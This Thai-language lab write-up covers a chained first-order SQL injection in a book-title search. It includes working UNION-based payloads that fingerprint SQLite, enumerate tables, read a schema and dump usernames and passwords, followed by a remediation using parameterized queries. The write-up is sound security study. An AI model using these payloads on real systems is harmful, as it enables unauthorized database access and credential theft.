# Day 7 — SQL Injection: Book Title 2 (Chained Query)

---

## สิ่งที่เรียนวันนี้

Day 7 เป็น First-Order SQL Injection เพราะ payload ทำงานจบใน request เดียว ไม่ได้ถูกเก็บลง database ก่อน

Challenge นี้มีคอนเซปคล้ายกับ Day 6 แต่แตกต่างกันในด้านโครงสร้างการทำงานของ query:

- **Day 6** → query เดียวที่มี subquery ซ้อนอยู่ภายใน SQL statement เดียวกัน: `query(subquery)`
- **Day 7** → 2 query แยกกันใน Python code ผลลัพธ์จาก query แรกถูกส่งเป็น string ไปใส่ query ที่ 2: `query > string > query`

ช่องโหว่ที่พบคือ query ดึงข้อมูล Book ใช้ string concatenation ไม่ใช้ parameterized query จำนวน **2 จุด** ทั้ง query แรกและ query ที่สอง

โจทย์บอกว่า query แรกสามารถ exploit ด้วย Boolean-based Blind ได้ แต่เพราะ query ที่สองก็มีช่องโหว่เหมือนกัน และแสดงผลลัพธ์ออกมาบนหน้าเว็บ จึงใช้ UNION-based แทนได้ ซึ่งเร็วกว่าและ noisy น้อยกว่า

ภาพรวมการ exploit:
```
query 1 > string > query 2
Boolean-based Blind > Payload(string) > UNION-based
```

---

## โครงสร้าง Query ที่มีช่องโหว่

```python
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)

if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

### Query ที่ 1

```sql
SELECT id FROM books WHERE title like '{title}%'
```

ทำงานโดยการรับค่า input เข้ามาโดยใช้ฟังก์ชัน `LIKE` ร่วมกับ `%` wildcard ไว้ด้านหลังสำหรับการ SELECT ข้อมูล จากนั้นส่งผลลัพธ์เป็น string ไปต่อยัง query ที่ 2

### Query ที่ 2

```sql
SELECT * FROM books WHERE id = '{bid['id']}'
```

ทำงานโดยการรับค่า `id` = ข้อมูล string ที่ส่งต่อจาก query ที่ 1

### ช่องโหว่อยู่ตรงไหน

ช่องโหว่อยู่ในจุดที่เกิดการรับค่า input และทำการจัดส่งข้อมูลด้วยการใช้ string concatenation ทั้ง 2 query

### ทำไมถึง exploit ด้วย UNION-based ได้แทน Boolean-based Blind

- **Boolean-based Blind** — เลือกใช้เมื่อระบบไม่แสดงผลลัพธ์ของ query ออกมา ใช้หลักการถาม true/false ทีละคำถาม
- **UNION-based** — ใช้เมื่อระบบแสดงผลลัพธ์ออกมาให้เห็นชัดเจน

Query ที่สองคือ `SELECT * FROM books` ซึ่งหน้าเว็บแสดงผลลัพธ์ออกมาเป็น title, description, author — จึงเลือกส่ง payload ผ่าน query แรกไป exploit ที่ query ที่สองด้วย UNION-based แทน ซึ่งได้ข้อมูลทั้งหมดในครั้งเดียว ไม่ต้องส่งหลายร้อย request แบบ Blind

---

## ขั้นตอนการ Exploit

### Step 0 — ตรวจสอบโครงสร้างการทำงานของ query

```
Query 1:
SELECT id FROM books WHERE title like '' union select 'STRING%'

Query 2:
SELECT * FROM books WHERE id = 'STRING%'
```

### Step 1 — ระบุชนิดของ Database Engine

**Payload ที่ฉีดเข้า search field:**
```sql
' union select '-1''union select 1,2,3,sqlite_version()-- -
```

**อธิบายแต่ละส่วนของ payload:**

- ใช้ `'` นำหน้า `union select` เพื่อปิดเงื่อนไข LIKE
- ใช้ `-1` เนื่องจากต้องการให้ค่า `id=-1` ซึ่งไม่มีอยู่จริงในระบบ — ผลลัพธ์จาก WHERE clause จะว่างเปล่า เหลือแค่ข้อมูลจาก UNION SELECT ของเราอย่างเดียว ไม่ปนกับข้อมูลจริง
- ใช้ `''` (double quote escape) นำหน้า `union select 1,2,...` เพื่อปิดเงื่อนไข `id=-1` — `''` ใน SQL คือ escaped single quote หมายถึงตัวอักษร `'` หนึ่งตัว ซึ่งจะไปปิด string ใน query ที่สอง
- ใช้ `sqlite_version()` ในตำแหน่งที่ 4 เพื่อให้ข้อมูลแสดงที่ตำแหน่งของ author (สามารถใช้ตำแหน่งที่ 2, 3, 4 ได้ แต่ตำแหน่งที่ 1 ผลลัพธ์จะไม่แสดงเพราะเป็น `id` primary key ที่หน้าเว็บไม่ render ออกมา)
- ใช้ `-- -` ต่อในส่วนท้ายเพื่อตัดเงื่อนไขที่เหลือทั้งหมด รวมถึง `%` wildcard

**Query ที่ระบบ execute:**
```sql
-- Query 1:
SELECT id FROM books WHERE title like '' union select '-1''union select 1,2,3,sqlite_version()-- -%'
-- ผลลัพธ์คืนมา: -1'union select 1,2,3,sqlite_version()-- -

-- Query 2:
SELECT * FROM books WHERE id = '-1'union select 1,2,3,sqlite_version()-- -'
```

### Step 2 — Enumerate Tables

**Payload:**
```sql
' union select '-1''union select 1,2,3,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=''table'' AND tbl_name NOT LIKE ''sqlite_%'')-- -
```

> ต้องใช้ `''` (double quote escape) ในตำแหน่ง `''table''` และ `''sqlite_%''` เนื่องจากเครื่องหมาย `'` เมื่ออยู่ภายใน string ของ query แรกจะปิด string ก่อนเวลา ทำให้ SQL syntax พัง — จำเป็นต้องมี `''` escape เพิ่มอีก 1 ชั้น (พังแค่ชั้นนอก ชั้นจริงไม่พัง)

**Query ที่ระบบ execute:**
```sql
-- Query 1:
SELECT id FROM books WHERE title like '' union select '-1''union select 1,2,3,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type=''table'' AND tbl_name NOT LIKE ''sqlite_%'')-- -%'

-- Query 2:
SELECT * FROM books WHERE id = '-1'union select 1,2,3,(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' AND tbl_name NOT LIKE 'sqlite_%')-- -%'
```

**ตัวอย่าง escape ที่ SQL syntax ไม่พัง vs พัง:**

```sql
-- ✅ ไม่พัง (ใช้ '' escape)
type=''table'' AND tbl_name NOT LIKE ''sqlite_%''

-- ❌ พัง (ไม่ได้ escape)
type='table' AND tbl_name NOT LIKE 'sqlite_%'
```

### Step 3 — ตรวจสอบโครงสร้างของ Table

> ⚠️ ไม่เปิดเผยชื่อ Table จริงที่เกี่ยวข้องกับโจทย์ — ใช้ T1 แทน

**Payload:**
```sql
' union select '-1''union select 1,2,3,(SELECT sql FROM sqlite_master WHERE type!=''meta'' AND sql NOT NULL AND name=''T1'')-- -
```

**Query ที่ระบบ execute:**
```sql
-- Query 1:
SELECT id FROM books WHERE title like '' union select '-1''union select 1,2,3,(SELECT sql FROM sqlite_master WHERE type!=''meta'' AND sql NOT NULL AND name=''T1'')-- -%'

-- Query 2:
SELECT * FROM books WHERE id = '-1'union select 1,2,3,(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name='T1')-- -%'
```

### Step 4 — Dump ข้อมูลภายใน Table

**Payload:**
```sql
' union select '-1''union select 1,2,3,(SELECT group_concat(id || "," || username || "," || password || ":") FROM T1)-- -
```

**Query ที่ระบบ execute:**
```sql
-- Query 1:
SELECT id FROM books WHERE title like '' union select '-1''union select 1,2,3,(SELECT group_concat(id || "," || username || "," || password || ":") FROM T1)-- -%'

-- Query 2:
SELECT * FROM books WHERE id = '-1'union select 1,2,3,(SELECT group_concat(id || "," || username || "," || password || ":") FROM T1)-- -%'
```

พบ flag ใน table ที่ dump ออกมา

---

## จุดที่เข้าใจผิดและต้องแก้ไข

### 1. First-Order vs Second-Order — สับสนในตอนแรก

**เข้าใจผิด:** คิดว่า Day 7 เป็น Second-Order เพราะมี 2 query ที่ทำงานต่อกัน ระบบจุดชนวนให้อัตโนมัติ

**ที่ถูกต้อง:** Day 7 เป็น First-Order เพราะ payload ทำงานจบใน request เดียว ไม่ได้ถูกเก็บลง database ก่อน — Second-Order คือ payload ถูกเก็บลง database แล้ว trigger ทีหลังใน request อื่น (Day 4-5)

### 2. โครงสร้าง query — สับสนกับ subquery ของ Day 6

**เข้าใจผิด:** คิดว่า 2 query ของ Day 7 เป็น subquery ซ้อนกันแบบ Day 6

**ที่ถูกต้อง:** Day 6 คือ query เดียวที่มี subquery ซ้อนอยู่ใน SQL statement เดียวกัน แต่ Day 7 คือ 2 query แยกกันใน Python code ที่ส่งผลลัพธ์ต่อกันเป็น string

### 3. `''` escape — สับสนว่าวงเล็บทำให้ query พัง

**เข้าใจผิด:** คิดว่าวงเล็บ `()` ทำให้ผลลัพธ์ไม่แสดง จึงลองเอาวงเล็บออก

**ที่ถูกต้อง:** ปัญหาคือเครื่องหมาย `'` ภายใน payload ปิด string ก่อนเวลา ต้อง escape ด้วย `''` ส่วนวงเล็บ `()` ผ่านได้ปกติไม่ต้อง escape

### 4. `%` wildcard — เข้าใจผิดว่าเป็น pattern matching เสมอ

**เข้าใจผิด:** คิดว่า `SELECT '1%'` จะทำ pattern matching เหมือน LIKE

**ที่ถูกต้อง:** `%` เป็น wildcard เฉพาะเมื่อใช้กับ `LIKE` เท่านั้น — ใน `SELECT '1%'` SQL มองเป็นแค่ตัวอักษร `%` ธรรมดา

---

## Finding ที่ควรแจ้งลูกค้า

### Finding 1: First-Order SQL Injection ที่หน้า Book Title
- **Severity:** Critical
- **Root cause:** Query ดึงข้อมูล Book ใช้ string concatenation ไม่ใช้ parameterized query จำนวน 2 จุด

```python
bid = db.sql_query(f"SELECT id FROM books WHERE title like '{title}%'", one=True)

if bid:
    query = f"SELECT * FROM books WHERE id = '{bid['id']}'"
```

- **Impact:** Attacker สามารถ dump ข้อมูลทั้งหมดใน database ได้ รวมถึง username และ password ของทุก user
- **Remediation:** เปลี่ยนเป็น parameterized query (`?`) ทั้ง 2 จุด

```python
# Query 1 — เปลี่ยนจาก f-string เป็น ?
db.sql_query("SELECT id FROM books WHERE title LIKE ?", [title + "%"])

# Query 2 — เปลี่ยนจาก f-string เป็น ?
db.sql_query("SELECT * FROM books WHERE id = ?", [bid['id']])
```

> ทุก query ที่มีค่าจากภายนอก ต้องใช้ `?` placeholder ไม่ใช่ string concatenation

---

## Lesson สำคัญที่สุดของวันนี้

- **การส่งข้อมูลแบบ string ไปประมวลผลต่อใน query ทำให้ต้อง escape `'` เป็น `''`** — หาก payload ต้องผ่าน query แรกในฐานะ string ก่อน ทุก `'` ที่อยู่ใน payload จะปิด string ก่อนเวลา ทำให้ SQL syntax พัง จำเป็นต้องใช้ `''` (double quote escape) เพิ่มอีก 1 ชั้น (พังแค่ชั้นนอก ชั้นจริงไม่พัง)

- **`%` wildcard ทำงานเฉพาะกับ `LIKE` เท่านั้น** — ในกรณีที่มีการใช้งานฟังก์ชัน LIKE จะมี `%` ตามส่วนท้ายของค่า input เสมอ สามารถใช้ `-- -` สำหรับตัด `%` ออกได้

- **Day 6 vs Day 7 — โครงสร้างต่างกันในแง่ของการเรียกใช้งาน** — Day 6 คือ `query(subquery)` ซ้อนอยู่ใน SQL statement เดียวกัน แต่ Day 7 คือ `query > string > query` แยกกันใน Python code

- **UNION-based vs Boolean-based Blind** — เลือกใช้ UNION-based ได้เมื่อระบบแสดงผลลัพธ์ออกมาให้เห็น ซึ่งเร็วกว่าและ noisy น้อยกว่า Blind ที่ต้องถาม true/false ทีละคำถาม

---

## เปรียบเทียบ SQLi ที่เรียนมาทั้ง 7 วัน

| **Day** | **ประเภท** | **จุดที่ฉีด** | **ผล execute** | **ลักษณะ** |
|---------|-----------|-------------|---------------|-----------|
| Day 1 | First-Order (In-band) | Login form | ทันที | ผลแสดงโดยตรง |
| Day 2 | First-Order (In-band) | UPDATE profile | ทันที | แก้ไขข้อมูลใน DB |
| Day 3 | First-Order (In-band + Blind) | Login form | ทันที | Classic + Boolean-based Blind |
| Day 4 | Second-Order | Register → Notes | ทีหลัง | Payload เก็บก่อน trigger ทีหลัง |
| Day 5 | Second-Order | Register → Change Password | ทีหลัง | Account takeover |
| Day 6 | First-Order (In-band) | Book Title search | ทันที | query(subquery) ซ้อนกัน |
| Day 7 | **First-Order (Chained)** | Book Title search | **ทันที** | **query > string > query แยกกัน** |

---

*Day 7 Complete — ต่อไป: Day 8*
